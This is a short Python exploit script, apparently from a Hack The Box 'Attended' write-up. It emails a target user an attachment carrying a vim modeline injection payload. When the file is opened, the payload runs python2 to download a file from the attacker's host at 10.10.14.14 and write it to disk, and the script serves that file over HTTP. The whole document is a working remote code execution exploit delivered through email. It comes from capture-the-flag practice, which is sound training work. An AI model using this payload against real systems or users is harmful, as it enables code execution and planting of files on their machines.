#!/usr/bin/env python3

##
## 0xdf
## https://0xdf.gitlab.io/2021/05/08/htb-attended.html
##
##

import http.server
import smtplib
import socketserver
import sys
from datetime import datetime
from email.message import EmailMessage


upload_file = sys.argv[1]
path = sys.argv[2]
payload = f''':!python2 -c "import requests; resp = requests.get('http://10.10.14.14/{upload_file}', stream=True); fd = open('{path}', 'wb'); fd.write(resp.content); fd.close()"|" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="'''

msg = EmailMessage()
msg["From"] = 'freshness@attended.htb'
msg["To"] = 'guly@attended.htb'
msg["Subject"] = 'file you asked for?'
msg.set_content = 'Here you go'
msg.add_attachment(payload, filename="poc.txt")

s = smtplib.SMTP('10.10.10.221', 25)
s.send_message(msg)
print(f'[+] Email sent at {datetime.now()}')

handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", 80), handler) as httpd:
    print("[+] Waiting for HTTP request")
    httpd.handle_request()
    
#############
##
##
